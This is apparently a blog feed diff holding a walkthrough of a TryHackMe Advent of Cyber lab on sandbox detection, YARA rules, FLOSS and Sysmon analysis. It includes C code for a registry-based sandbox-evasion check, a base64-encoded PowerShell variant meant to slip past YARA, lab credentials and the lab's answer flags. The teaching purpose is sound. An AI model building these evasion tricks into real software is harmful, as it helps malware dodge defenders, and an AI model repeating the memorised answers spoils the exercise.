 <p>| <a href="https://e.customeriomail.com/e/c/eyJlbWFpbF9pZCI6ImRnVEsxUVVEQUllb1hJYW9YQUdUb2VkeFVSNUxzd0MyQjZGM2psOD0iLCJocmVmIjoiaHR0cHM6Ly90cnloYWNrbWUuY29tL3Ivcm9vbS9hZHZlbnRvZmN5YmVyMjAyND91dG1fc291cmNlPWN1c3RvbWVyLmlvXHUwMDI2dXRtX21lZGl1bT1lbWFpbFx1MDAyNnV0bV9jYW1wYWlnbj1hb2MyMDI0XHUwMDI2dXRtX2NvbnRlbnQ9ZGFpbHlfZW1haWxzIiwiaW50ZXJuYWwiOiJjYWQ1MDUzMmE2NjE4N2E4NWMiLCJsaW5rX2lkIjoxNjA3MX0/a1e20f3f3433560c8a920ab3a952681b9f5fb14047917c5427b37ecb8bb0b5bd"> <img src="https://ci3.googleusercontent.com/meips/ADKq_Nbm6h-hqqbF-A5NVyxCrIDJGj0BG7orq40mahoNZZ_PfgZMMsPQuc1TWGiJiulVgyJ9UnWSOVyT9hfse4n-AZBn3ZmOU3Fx0mvAE1yBD6-CRnHjercYx7oTnuWihhrzDF0KJsc85VuliA2St9Sv4c01hK2ix7s-d2hMnWRTlI8NI6-10yWpwZ4g32jxfmoYODJqgN1uGxdWRjJ0gy0W4lNK6ZqE3eMkC-4dJmAnNIY2jis0Jg8=s0-d-e1-ft#https://userimg-assets.customeriomail.com/images/client-env-92874/1731327229375_THM%20AoC%202024%20Logo%20White%20-%20900x600px_01JCDJ9ZH8BYM6E9WYP0SE4SG0.png" alt="" /></a><a href="https://e.customeriomail.com/e/c/eyJlbWFpbF9pZCI6ImRnVEsxUVVEQUllb1hJYW9YQUdUb2VkeFVSNUxzd0MyQjZGM2psOD0iLCJocmVmIjoiaHR0cHM6Ly90cnloYWNrbWUuY29tL3Ivcm9vbS9hZHZlbnRvZmN5YmVyMjAyND91dG1fc291cmNlPWN1c3RvbWVyLmlvXHUwMDI2dXRtX21lZGl1bT1lbWFpbFx1MDAyNnV0bV9jYW1wYWlnbj1hb2MyMDI0XHUwMDI2dXRtX2NvbnRlbnQ9ZGFpbHlfZW1haWxzIiwiaW50ZXJuYWwiOiJjYWQ1MDUzMmE2NjE4N2E4NWMiLCJsaW5rX2lkIjoxNjA3MX0/a1e20f3f3433560c8a920ab3a952681b9f5fb14047917c5427b37ecb8bb0b5bd"> <img src="https://ci3.googleusercontent.com/meips/ADKq_NYwPph0JdvOQmKyD5Y76urdco25JxaV6oKeQGQZIndYlajEV7OM_dCGmVQ8l1dJeCVSQnpRLU1OLzHcNSFOzFeQ_zTF3bzLWPSLXa7suFzBWIvFtC90TKk4VPQq0KCeTaEx3mnWUQFOkMKZKtS9l-OahGxNTH8Fo0ObQ3VOsHiRe7LynV5oaDokI1-gS7sqFyzf4eiNlv1m2X2d4M0zJl7OTiB5=s0-d-e1-ft#https://userimg-assets.customeriomail.com/images/client-env-92874/1731666415355_AoC%20Design%202%20-%20Day%207_01JCQNS48HCWHVDWRYJ36657QK.png" alt="TryHackMe" title="TryHackMe" /></a><strong>Advent of Cyber: New Task Release!</strong>Oh, no. I’M SPEAKING IN CLOUDTRAIL! <img src="https://ci3.googleusercontent.com/meips/ADKq_NbjcwtpiqEZxM14rGt2ee0SnDMd64u1cObyR7kYo_0aYV3FIx2W3yTazUZiME6s2CUi_RhNMMpOT7UtA1rzS6QSR2zxrlotSiP4c6qRTqKG9G7o17ltlL_NOYxbTUjkkkS_gMrKIBQvpccHasqgDU-6i1nE6dA008-He3rpSpLfxm7x6Jo7HmW8Vsm6o1V-sM_7A8772Z7CpQCCvPXF5U2AZGkNsuYo55neUYfTaxaQ9Hjg=s0-d-e1-ft#https://userimg-assets.customeriomail.com/images/client-env-92874/1731074725184_McSkiddy%20-%20AoC%20Character%20Card%20326px_01JC61G5R9MD3M6SV23JW61WFK.png" alt="" />In day 7 of Advent of Cyber, McSkidy and the SOC team investigate the disappearance of funds from a local charity. <strong>Topics Covered:</strong>AWS log analysis  |
@@ -805,7 +835,293 @@ What is the bank account number owned by Mayor Malware?
 
 Want to learn more about log analysis and how to interpret logs from different sources? Check out [the Log Universe](https://tryhackme.com/r/room/loguniverse) room!
 
-</canter>]]></content><author><name>Michael</name></author><category term="documentation" /><category term="documentation" /><category term="AoC" /><summary type="html"><![CDATA[| | |—-|]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/Day7-logo.png" /><media:content medium="image" url="http://localhost:4000/Day7-logo.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Try Hackme Advent of Cyber - Day 5</title><link href="http://localhost:4000/Day5" rel="alternate" type="text/html" title="Try Hackme Advent of Cyber - Day 5" /><published>2024-12-05T00:00:00-05:00</published><updated>2024-12-05T00:00:00-05:00</updated><id>http://localhost:4000/Day5</id><content type="html" xml:base="http://localhost:4000/Day5"><![CDATA[<h1 id="advent-of-cyber-day-5">Advent of Cyber Day 5</h1>
+</canter>]]></content><author><name>Michael</name></author><category term="documentation" /><category term="documentation" /><category term="AoC" /><summary type="html"><![CDATA[| | |—-|]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/Day7-logo.png" /><media:content medium="image" url="http://localhost:4000/Day7-logo.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Try Hackme Advent of Cyber - Day 6</title><link href="http://localhost:4000/Day6" rel="alternate" type="text/html" title="Try Hackme Advent of Cyber - Day 6" /><published>2024-12-06T00:00:00-05:00</published><updated>2024-12-06T00:00:00-05:00</updated><id>http://localhost:4000/Day6</id><content type="html" xml:base="http://localhost:4000/Day6"><![CDATA[<p><em>Mayor Malware was scheming, quite full of delight, To ruin SOC-mas and frighten SOC teams. But Glitch and McSkidy had spoiled his plan, By uncovering secrets that exposed the man!</em></p>
+
+<p>Mayor Malware slammed his hand on the table, his eyes narrowing as the report flashed on his screen. Glitch and McSkidy had uncovered his trail. He took a deep breath, calming himself. <em>“No matter,”</em> he muttered, a sinister grin forming. <em>“They may have found me but haven’t stopped me.”</em> His confidence stemmed from the malware he had crafted—so devious and advanced that it would easily evade detection.</p>
+
+<p>But before unleashing it to wreak havoc on SOC teams and ruin SOC-mas, there was one final step. He needed to test it <a href="in">in</a> a sandbox.</p>
+
+<h2 id="learning-objectives">Learning Objectives</h2>
+
+<ul>
+  <li>Analyze malware behaviour using sandbox tools.</li>
+  <li>Explore how to use YARA rules to detect malicious patterns.</li>
+  <li>Learn about various malware evasion techniques.</li>
+  <li>Implement an evasion technique to bypass YARA rule detection.</li>
+</ul>
+
+<h2 id="connecting-to-the-machine">Connecting to the Machine</h2>
+
+<p>Before moving forward, review the questions in the connection card shown below:</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/63588b5ef586912c7d03c4f0-1730728927615.png" alt="Connection card" /></p>
+
+<p>Click on the green <code class="language-plaintext highlighter-rouge">Start Machine</code> Button below to start the virtual machine in split-screen view.</p>
+
+<p>If the VM is not visible, use the blue <code class="language-plaintext highlighter-rouge">Show Split View</code> button at the top of the page. Alternatively, you can connect to the VM via Remote Desktop (RDP) using the credentials below:</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/be629720b11a294819516c1d4e738c92.png" alt="THM credentials RDP" /></p>
+
+<table>
+  <thead>
+    <tr>
+      <th><strong>Username</strong></th>
+      <th>administrator</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Password</strong></td>
+      <td>TryH@cKMe9#21</td>
+    </tr>
+    <tr>
+      <td><strong>IP</strong></td>
+      <td>MACHINE_IP</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><em>He slipped his malware into a sandbox to see, \n What tricks it could play and what flaws there might be. \n For sandboxes, you see, are used by the wise, Defenders inspect, but attackers revise!</em></p>
+
+<h2 id="detecting-sandboxes">Detecting Sandboxes</h2>
+
+<p>A sandbox is an isolated environment where (malicious) code is executed without affecting anything outside the system. Often, multiple tools are installed to monitor, record, and analyze the code’s behaviour.</p>
+
+<p>Mayor Malware knows that before his malware executes, it needs to check if it is running on a Sandbox environment. If it is, then it should not continue with its malicious activity.</p>
+
+<p>To do so, he has settled on one technique, which checks if the directory <code class="language-plaintext highlighter-rouge">C:\Program Files</code> is present by querying the Registry path <code class="language-plaintext highlighter-rouge">HKLM\\Software\\Microsoft\\Windows\\CurrentVersion</code>. The value can be confirmed by visiting the Registry path within the Registry Editor, as shown below:</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/5e8dd9a4a45e18443162feab-1730152060596.png" alt="Registry editor" /></p>
+
+<p>To open the <code class="language-plaintext highlighter-rouge">Windows Registry Editor</code>, navigate to the <code class="language-plaintext highlighter-rouge">Start Menu</code> on the bottom, select <code class="language-plaintext highlighter-rouge">Run</code>, enter <code class="language-plaintext highlighter-rouge">regedit</code>, and press enter.</p>
+
+<p>This directory is often absent on sandboxes or other virtualized environments, which could indicate that the malware is running in a sandbox.</p>
+
+<p>Here’s what it looks like in the C Programming Language:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">void</span> <span class="nf">registryCheck</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="nx">char</span> <span class="o">*</span><span class="nx">registryPath</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">HKLM</span><span class="se">\\</span><span class="s2">Software</span><span class="se">\\</span><span class="s2">Microsoft</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">CurrentVersion</span><span class="dl">"</span><span class="p">;</span>
+    <span class="kd">const</span> <span class="nx">char</span> <span class="o">*</span><span class="nx">valueName</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">ProgramFilesDir</span><span class="dl">"</span><span class="p">;</span>
+
+    <span class="c1">// Prepare the command string for reg.exe</span>
+    <span class="nx">char</span> <span class="nx">command</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
+    <span class="nf">snprintf</span><span class="p">(</span><span class="nx">command</span><span class="p">,</span> <span class="nf">sizeof</span><span class="p">(</span><span class="nx">command</span><span class="p">),</span> <span class="dl">"</span><span class="s2">reg query </span><span class="se">\"</span><span class="s2">%s</span><span class="se">\"</span><span class="s2"> /v %s</span><span class="dl">"</span><span class="p">,</span> <span class="nx">registryPath</span><span class="p">,</span> <span class="nx">valueName</span><span class="p">);</span>
+    <span class="c1">// Run the command</span>
+    <span class="nx">int</span> <span class="nx">result</span> <span class="o">=</span> <span class="nf">system</span><span class="p">(</span><span class="nx">command</span><span class="p">);</span>
+    <span class="c1">// Check for successful execution</span>
+    <span class="k">if </span><span class="p">(</span><span class="nx">result</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nf">printf</span><span class="p">(</span><span class="dl">"</span><span class="s2">Registry query executed successfully.</span><span class="se">\n</span><span class="dl">"</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nf">fprintf</span><span class="p">(</span><span class="nx">stderr</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Failed to execute registry query.</span><span class="se">\n</span><span class="dl">"</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="nx">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="nx">char</span> <span class="o">*</span><span class="nx">flag</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">[REDACTED]</span><span class="dl">"</span><span class="p">;</span>
+    <span class="nf">registryCheck</span><span class="p">();</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>\n Don’t worry—you don’t have to understand every detail of the code. All you need to know is that this function is designed to check the system’s registry for a specified directory path (ProgramFilesDir). This path’s presence or absence helps the malware determine whether it’s running in a typical or virtualized environment,like a sandbox.</p>
+
+<h2 id="can-yara-do-it">Can YARA Do It?</h2>
+
+<p>Mayor Malware knows that McSkidy is a big fan of YARA rules.</p>
+
+<p>YARA is a tool used to identify and classify malware based on patterns in its code. By writing custom rules, analysts can define specific characteristics to look for—such as particular strings, file headers, or behaviours—and YARA will scan files or processes to find matches, making it invaluable for detecting malicious code.</p>
+
+<p>Mayor Malware does not think such a simple tool can detect his malware. But just to be sure, he has to test it out himself.</p>
+
+<p>To do this, he wrote a small script that executes a YARA detection rule every time a new event is added to the System monitor log. This particular YARA rule detects any command that tries to access the registry. \n</p>
+
+<p>Let’s have a look at the rule:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">rule</span> <span class="nx">SANDBOXDETECTED</span>
+<span class="p">{</span>
+    <span class="nl">meta</span><span class="p">:</span>
+        <span class="nx">description</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">Detects the sandbox by querying the registry key for Program Path</span><span class="dl">"</span>
+        <span class="nx">author</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">TryHackMe</span><span class="dl">"</span>
+        <span class="nx">date</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">2024-10-08</span><span class="dl">"</span>
+        <span class="nx">version</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">1.1</span><span class="dl">"</span>
+
+    <span class="nx">strings</span><span class="p">:</span>
+
+    <span class="nx">$cmd</span><span class="o">=</span> <span class="dl">"</span><span class="s2">Software</span><span class="se">\\</span><span class="s2">Microsoft</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">CurrentVersion</span><span class="se">\"</span><span class="s2"> /v ProgramFilesDir</span><span class="dl">"</span> <span class="nx">nocase</span>
+
+
+
+    <span class="nx">condition</span><span class="p">:</span>
+        <span class="nx">$cmd</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Let’s understand the contents:</p>
+
+<ul>
+  <li>In the <strong>strings</strong> section, we have defined variables that include the value to look out for: $cmd</li>
+  <li>In the <strong>condition</strong> section, we define when the rule will match the scanned file. In this case, if any of the specified strings are present.</li>
+</ul>
+
+<p>For his testing, Mayor Malware has set up a one-function script that runs the Yara rule and logs a true positive in <code class="language-plaintext highlighter-rouge">C:\Tools\YaraMatches.txt</code>.</p>
+
+<p>Open up a PowerShell window, navigate to the <code class="language-plaintext highlighter-rouge">C:\Tools</code> directory, and use the following command to start up the EDR:</p>
+
+<p>Administrator: Windows PowerShell</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>           <span class="nx">PS</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Tools</span><span class="o">&gt;</span> <span class="p">.</span><span class="err">\</span><span class="nx">JingleBells</span><span class="p">.</span><span class="nx">ps1</span>
+<span class="nx">No</span> <span class="nx">events</span> <span class="nx">found</span> <span class="k">in</span> <span class="nx">Sysmon</span> <span class="nx">log</span><span class="p">.</span>
+<span class="nx">Monitoring</span> <span class="nx">Sysmon</span> <span class="nx">events</span><span class="p">...</span> <span class="nx">Press</span> <span class="nx">Ctrl</span><span class="o">+</span><span class="nx">C</span> <span class="nx">to</span> <span class="nx">exit</span><span class="p">.</span>
+
+</code></pre></div></div>
+
+<p>This tool will run on the system and continuously monitor the generated Event Logs. It will alert you if it finds any activity/event that indicates the registry mentioned above key is being queried.</p>
+
+<p>Now run the malware by navigating to <code class="language-plaintext highlighter-rouge">C:\Tools\Malware</code>, and double-clicking on <code class="language-plaintext highlighter-rouge">MerryChristmas.exe</code>.</p>
+
+<p>If our custom script did its job, you should have witnessed a popup by our EDR with a flag included, as shown below. This will be the answer to Question 1 below. You can now exit the custom EDR by pressing <code class="language-plaintext highlighter-rouge">Ctrl+C</code>.</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/5e8dd9a4a45e18443162feab-1730154020793.png" alt="PowerShell taskbar item" /></p>
+
+<p><strong><em>Note:</em></strong> <em>If the popup does not show up, hover over the PowerShell item in the taskbar. It should show the popup that was generated.</em></p>
+
+<h2 id="adding-more-evasion-techniques">Adding More Evasion Techniques</h2>
+
+<p>Ah, it seems that Yara can detect the evasion that Mayor Malware has added. No worries. Because we can make our malware even stealthier by introducing obfuscation.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">void</span> <span class="nf">registryCheck</span><span class="p">()</span> <span class="p">{</span>
+<span class="c1">// Encoded PowerShell command to query the registry</span>
+    <span class="kd">const</span> <span class="nx">char</span> <span class="o">*</span><span class="nx">encodedCommand</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">RwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuACIAIAAtAE4AYQBtAGUAIABQAHIAbwBnAHIAYQBtAEYAaQBsAGUAcwBEAGkAcgA=</span><span class="dl">"</span><span class="p">;</span>
+    <span class="c1">// Prepare the PowerShell execution command</span>
+    <span class="nx">char</span> <span class="nx">command</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
+    <span class="nf">snprintf</span><span class="p">(</span><span class="nx">command</span><span class="p">,</span> <span class="nf">sizeof</span><span class="p">(</span><span class="nx">command</span><span class="p">),</span> <span class="dl">"</span><span class="s2">powershell -EncodedCommand %s</span><span class="dl">"</span><span class="p">,</span> <span class="nx">encodedCommand</span><span class="p">);</span>
+
+    <span class="c1">// Run the command</span>
+    <span class="nx">int</span> <span class="nx">result</span> <span class="o">=</span> <span class="nf">system</span><span class="p">(</span><span class="nx">command</span><span class="p">);</span>
+
+    <span class="c1">// Check for successful execution</span>
+    <span class="k">if </span><span class="p">(</span><span class="nx">result</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nf">printf</span><span class="p">(</span><span class="dl">"</span><span class="s2">Registry query executed successfully.</span><span class="se">\n</span><span class="dl">"</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nf">fprintf</span><span class="p">(</span><span class="nx">stderr</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Failed to execute registry query.</span><span class="se">\n</span><span class="dl">"</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><strong>Code Explanation</strong></p>
+
+<p>The above code does the same thing: query the same registry key to get the information about the Program Data. The only difference is that the query is now encoded using base64, and the code uses the PowerShell to execute the query. The encoded string can be checked by decoding it using a tool like <a href="https://gchq.github.io/CyberChef/">CyberChef</a>, as shown below: \n</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/66c44fd9733427ea1181ad58/room-content/66c44fd9733427ea1181ad58-1730911341730.png" alt="CyberChef GUI" /></p>
+
+<h2 id="beware-of-floss">Beware of Floss</h2>
+
+<p>While obfuscation is helpful, we also need to know that there are tools available that extract obfuscated strings from malware binaries. One such tool is Floss, a powerful tool developed by Mandiant that functions similarly to the Linux strings tool but is optimized for malware analysis, making it ideal for revealing any concealed details.</p>
+
+<p>To try out Floss, open a PowerShell Window and enter the following command:</p>
+
+<p>Administrator: Windows Powershell \n</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>           <span class="nx">PS</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Tools</span><span class="err">\</span><span class="nx">FLOSS</span><span class="o">&gt;</span> <span class="nx">floss</span><span class="p">.</span><span class="nx">exe</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Tools</span><span class="err">\</span><span class="nx">Malware</span><span class="err">\</span><span class="nx">MerryChristmas</span><span class="p">.</span><span class="nx">exe</span> <span class="o">|</span><span class="nx">Out</span><span class="o">-</span><span class="nx">file</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">tools</span><span class="err">\</span><span class="nx">malstrings</span><span class="p">.</span><span class="nx">txt</span>
+
+</code></pre></div></div>
+
+<p>The above command can take up to two minutes to complete. In the meantime, let’s break down the command:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">floss.exe C:\Tools\Malware\MerryChristmas.exe</code>: This command scans for strings in the binary MerryChrismas.exe. If any hardcoded variables were defined in the malware, Floss should find them.</li>
+  <li>The <code class="language-plaintext highlighter-rouge">|</code>symbol redirects the output of the command in front of it to the input of the command behind it. \n</li>
+  <li><code class="language-plaintext highlighter-rouge">Out-file C:\tools\malstrings.txt</code>: We save the command results in a file called <code class="language-plaintext highlighter-rouge">malstrings.txt</code>.</li>
+</ul>
+
+<p>Once the command is done, open <code class="language-plaintext highlighter-rouge">malstrings.txt</code>, press <code class="language-plaintext highlighter-rouge">CTRL+F</code>, and search for the string Mayor Malware. Enter the flag as the answer to question two. The format of the string is <code class="language-plaintext highlighter-rouge">THM{}</code>.</p>
+
+<h2 id="using-yara-rules-on-sysmon-logs">Using YARA Rules on Sysmon Logs</h2>
+
+<p>These YARA rules are becoming a pain to Mayor Malware’s backside.</p>
+
+<p>If he wants his malware to be undetectable, he needs to research how YARA rules can be used to stop him. For example, his research tells him that YARA rules can also be used to check Sysmon logs for any artefacts left by malware! He’ll need to test this as well.</p>
+
+<p><strong>Sysmon</strong>, a tool from Microsoft’s Sysinternals suite, continuously monitors and logs system activity across reboots. This Windows service provides detailed event data on process creation, network connections, and file changes—valuable insights when tracing malware behaviour.</p>
+
+<p>A YARA rule will look for events with <code class="language-plaintext highlighter-rouge">event id 1: Process created</code> for this to work. There are many entries in the Sysmon log. To make it easier to find the event we are looking for, we will apply a custom filter using the <code class="language-plaintext highlighter-rouge">EventRecordID</code> that we can see in the log <code class="language-plaintext highlighter-rouge">YaraMatches.txt</code> located in <code class="language-plaintext highlighter-rouge">C:\Tools</code>.</p>
+
+<p>Open a PowerShell window and enter the following command to check the contents of the EDR log file:</p>
+
+<p><code class="language-plaintext highlighter-rouge">get-content C:\Tools\YaraMatches.txt</code></p>
+
+<p>You should get a result similar to the output below:</p>
+
+<p>Administrator: Windows PowerShell</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>           <span class="nx">PS</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Tools</span><span class="o">&gt;</span> <span class="kd">get</span><span class="o">-</span><span class="nx">content</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Tools</span><span class="err">\</span><span class="nx">YaraMatches</span><span class="p">.</span><span class="nx">txt</span>
+
+<span class="nx">Event</span> <span class="nx">Time</span><span class="p">:</span> <span class="mi">10</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2024</span> <span class="mi">15</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">39</span>
+<span class="nx">Event</span> <span class="nx">ID</span><span class="p">:</span> <span class="mi">1</span>
+<span class="nx">Event</span> <span class="nx">Record</span> <span class="nx">ID</span><span class="p">:</span> <span class="mi">96517</span>
+<span class="nx">Command</span> <span class="nx">Line</span><span class="p">:</span> <span class="nx">reg</span>  <span class="nx">query</span> <span class="dl">"</span><span class="s2">HKLM</span><span class="se">\</span><span class="s2">Software</span><span class="se">\</span><span class="s2">Microsoft</span><span class="se">\</span><span class="s2">Windows</span><span class="se">\</span><span class="s2">CurrentVersion</span><span class="dl">"</span> <span class="o">/</span><span class="nx">v</span> <span class="nx">ProgramFilesDir</span>
+<span class="nx">YARA</span> <span class="nx">Result</span><span class="p">:</span> <span class="nx">DetectShutdownTimeQuery</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Users</span><span class="err">\</span><span class="nx">Administrator</span><span class="err">\</span><span class="nx">AppData</span><span class="err">\</span><span class="nx">Local</span><span class="err">\</span><span class="nx">Temp</span><span class="err">\</span><span class="mi">2</span><span class="err">\</span><span class="nx">tmp8D61</span><span class="p">.</span><span class="nx">tmp</span>
+
+</code></pre></div></div>
+
+<p>Note down the <code class="language-plaintext highlighter-rouge">Event Record ID value</code>. We will use this value to create a custom filter in the <code class="language-plaintext highlighter-rouge">Windows Event Viewer</code>.</p>
+
+<p>Next, open the <code class="language-plaintext highlighter-rouge">Windows Event Viewer</code> by clicking on its logo in the taskbar and, on the left-hand side, navigate to <code class="language-plaintext highlighter-rouge">Applications and Services Logs -&gt; Microsoft -&gt; Windows -&gt; Sysmon -&gt; Operational</code>.</p>
+
+<p>Continue by navigating to <code class="language-plaintext highlighter-rouge">Filter Current Log</code> on the right-hand side of the screen.</p>
+
+<p>You should see a window like the one below:</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/66c44fd9733427ea1181ad58/room-content/66c44fd9733427ea1181ad58-1731059911377.png" alt="filter current log windows" /></p>
+
+<p>Navigate to XML and tick the checkbox <code class="language-plaintext highlighter-rouge">Edit query manually</code>. Click <code class="language-plaintext highlighter-rouge">Yes</code> to confirm. Finally, copy the following filter into the input box:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">QueryList</span><span class="o">&gt;</span>
+  <span class="o">&lt;</span><span class="nx">Query</span> <span class="nx">Id</span><span class="o">=</span><span class="dl">"</span><span class="s2">0</span><span class="dl">"</span> <span class="nx">Path</span><span class="o">=</span><span class="dl">"</span><span class="s2">Microsoft-Windows-Sysmon/Operational</span><span class="dl">"</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="nx">Select</span> <span class="nx">Path</span><span class="o">=</span><span class="dl">"</span><span class="s2">Microsoft-Windows-Sysmon/Operational</span><span class="dl">"</span><span class="o">&gt;</span>
+      <span class="o">*</span><span class="p">[</span><span class="nx">System</span><span class="p">[(</span><span class="nx">EventRecordID</span><span class="o">=</span><span class="dl">"</span><span class="s2">INSERT_EVENT_record_ID_HERE</span><span class="dl">"</span><span class="p">)]]</span>
+    <span class="o">&lt;</span><span class="sr">/Select</span><span class="err">&gt;
+</span>  <span class="o">&lt;</span><span class="sr">/Query</span><span class="err">&gt;
+</span><span class="o">&lt;</span><span class="sr">/QueryList</span><span class="err">&gt;
+</span></code></pre></div></div>
+
+<p>Replace the <code class="language-plaintext highlighter-rouge">EventRecordID</code> value with the one you recorded before. Apply the filter by clicking <code class="language-plaintext highlighter-rouge">OK</code>. Now you get the event related to the malware. Click on the event and then on the <code class="language-plaintext highlighter-rouge">Details</code> tab. You should get the following output:</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/66c44fd9733427ea1181ad58/room-content/66c44fd9733427ea1181ad58-1730105846377.png" alt="Screenshot of details tab" /></p>
+
+<p>Let’s take a look at the <code class="language-plaintext highlighter-rouge">EventData</code> that is valuable to us:</p>
+
+<ul>
+  <li>The <code class="language-plaintext highlighter-rouge">ParentImage</code> key shows us which parent process spawned the cmd.exe process to execute the registry check. We can see it was our malware located at <code class="language-plaintext highlighter-rouge">C:\Tools\Malware\MerryChristmas.exe</code>.</li>
+  <li>The <code class="language-plaintext highlighter-rouge">ParentProcessId</code> and <code class="language-plaintext highlighter-rouge">ProcessId</code> keys are valuable for follow-up research. We could also use them to check other logs for related events.</li>
+  <li>The <code class="language-plaintext highlighter-rouge">User</code> key can help us determine which privileges were used to run the <code class="language-plaintext highlighter-rouge">cmd.exe</code> command. The malware could have created a hidden account and used that to run commands.</li>
+  <li>The <code class="language-plaintext highlighter-rouge">CommandLine</code> key shows which command was run in detail, helping us identify the malware’s actions.</li>
+  <li>The <code class="language-plaintext highlighter-rouge">UtcTime</code> key is essential for creating a time frame for the malware’s operation. This time frame can help you focus your threat hunting efforts.</li>
+</ul>
+
+<h2 id="never-gonna-give-up">Never Gonna Give Up</h2>
+
+<p><em>His malware, it seemed, wasn’t quite ready for town. \n “There are watchers and scanners and rules by the ton! \n If I’m not careful, they’ll catch all my fun!”</em></p>
+
+<p>Mayor Malware leaned back, tapping his fingers thoughtfully on the table. All of this research had revealed an unsettling truth: his malware, as cunning as it was, wasn’t yet ready for the wild. There were too many tools and too many vigilant eyes—analysts armed with YARA rules, Sysmon, and a host of detection techniques that could expose his creation before it even had a chance to spread.</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/63588b5ef586912c7d03c4f0-1730728611995.png" alt="Yeti playing in a sandbox" /> \n</p>
+
+<p>He clenched his fist, a determined glint in his eye. <em>“Just a little more fine-tuning,”</em> he murmured. He would study, adapt, and evolve his malware until it was truly undetectable. When the time was right, he would unleash it upon the unsuspecting SOC teams, striking when they least expected it.</p>
+
+<p>But for now, he would wait. Watching. Planning. And he was perfecting his craft in the shadows.</p>
+
+<h2 id="answer-the-questions-below">Answer the questions below</h2>
+
+<p>What is the flag displayed in the popup window after the EDR detects the malware?</p>
+
+<p>THM{GlitchWasHere}</p>
+
+<p>What is the flag found in the malstrings.txt document after running floss.exe, and opening the file in a text editor?</p>
+
+<p>THM{HiddenClue}</p>
+
